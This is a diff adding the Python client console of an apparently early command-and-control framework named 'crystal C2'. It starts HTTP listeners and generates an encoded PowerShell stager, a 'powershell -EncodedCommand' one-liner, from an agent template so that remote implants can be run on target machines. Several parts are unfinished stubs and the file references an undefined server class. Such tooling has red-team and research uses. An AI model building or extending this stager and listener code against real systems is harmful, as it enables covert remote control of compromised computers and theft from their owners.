@@ -1,0 +1,160 @@
+#!/bin/python3
+from lib.helpers.encoder import powershell_encode
+import jinja2
+from lib.listeners.http import Listener
+from lib.helpers.output import failure, get_random_string, success
+import os, sys
+import random, base64
+from cmd import Cmd
+
+api_base = 'http://127.0.0.1:9292'
+
+NC = '\033[0m' # no colour
+WB = '\033[1m' # White bold
+R  = '\033[31m' # red
+G  = '\033[32m' # green
+O  = '\033[33m' # orange
+B  = '\033[96m' # cyan blue
+W  = '\033[97m' # white
+P  = '\033[35m' # purple
+
+
+def get_banner():
+    banners = [
+        f"""{P}
+                              __         .__   
+  ___________ ___.__. _______/  |______  |  |  
+_/ ___\_  __ <   |  |/  ___/\   __\__  \ |  |  
+\  \___|  | \/\___  |\___ \  |  |  / __ \|  |__
+ \___  >__|   / ____/____  > |__| (____  /____/
+     \/       \/         \/            \/      
+"""
+    ]
+
+    subline = "\ncrystal C2 v0.0.1\n"
+    return f"{random.choice(banners)}{B}{subline}{NC}"
+
+
+class BaseConsole(Cmd):
+    emptyline = lambda x: None
+
+    def __init__(self, encapsulatingConsole = None):
+        super().__init__()
+        self.encapsulatingConsole = encapsulatingConsole
+
+    def do_exit(self, inp):
+        sys.exit(0)
+
+    def help_exit(self):
+        print("Exit the console.")
+        print("You can also use the Ctrl-D shortcut.")
+
+    # emulate system shell
+    # --------------------------
+    def do_cd(self, inp):
+        if len(inp) > 0:
+            os.chdir(inp)
+            os.system('ls')
+
+    def help_cd(self):
+        print("Change working directory")
+        
+    def complete_cd(self, text, line, begidx, endidx):
+        return [i for i in os.listdir() if i.startswith(text)]
+
+    def default(self, inp):
+        os.system(inp)
+    # --------------------------
+
+    do_EOF = do_exit
+    help_EOF = help_exit
+
+    # escape subconsole
+    def do_back(self, args):
+        if self.encapsulatingConsole:
+            self.encapsulatingConsole.cmdloop()
+        else:
+            print(f"{R}[!]{NC} Type 'exit' to exit.")
+
+
+class StagerConsole(BaseConsole):
+    prompt = f"({B}crystal{NC}) {G}createstager{NC} > "
+    
+    options = {
+        "listener": "",
+    }
+
+    def do_set(self, option):
+        pass    # TODO set listener, generate encoded and obfuscated payload for that listener in a separate console
+
+    def complete_set(self, text, line, begidx, endidx):
+        return [option for option in self.options if option.startswith(text)]
+
+    def do_generate(self, args):
+        # read in powershell agent template
+        templateLoader = jinja2.FileSystemLoader(searchpath="./lib/agents")
+        templateEnv = jinja2.Environment(loader=templateLoader)
+        TEMPLATE_FILE = "powershell.ps1"
+        template = templateEnv.get_template(TEMPLATE_FILE)
+
+        # render with listeners ip and port
+        agent_payload = template.render(
+            LISTENER_IP="127.0.0.1", # TODO: read from options
+            LISTENER_PORT=1337            
+        )
+
+        payload = f"powershell -EncodedCommand {powershell_encode(agent_payload)}"
+        print(payload)
+
+    def help_generate(self):
+        print("Generate a payload for the current stager")
+
+
+class CrystalConsole(BaseConsole):
+    """
+    Main console
+    """
+    prompt = f"({B}crystal{NC}) > "
+
+    # print banner
+    def do_banner(self, args):
+        print(get_banner())
+
+    def help_banner(self):
+        print("Show a random banner")
+
+
+    # create listener
+    def do_createlistener(self, args):
+        name = get_random_string(8)
+        listener = Listener(name) # TODO set port, ip
+        try:
+            listener.run_as_daemon()
+            success(f"Listener {listener.name} listening on {listener.ipaddress}:{listener.port}")
+        except OSError as err:
+            failure(f"Could not create listener due to error: {err}.")
+            
+    def help_createlistener(self):
+        print("Create a listener")
+
+    # ===============================
+    # create stager
+    def do_createstager(self, args):
+        StagerConsole(self).cmdloop()
+            
+    def help_createlistener(self):
+        print("Create a listener")
+
+
+if __name__ == '__main__':
+
+    if len(sys.argv) != 2:
+        print("Usage: crystalc2 [server | client]")
+
+    print(get_banner())
+
+    if sys.argv[1] == "server":
+        CrystalServer().run()
+
+    elif sys.argv[1] == "client":
+        CrystalConsole().cmdloop()
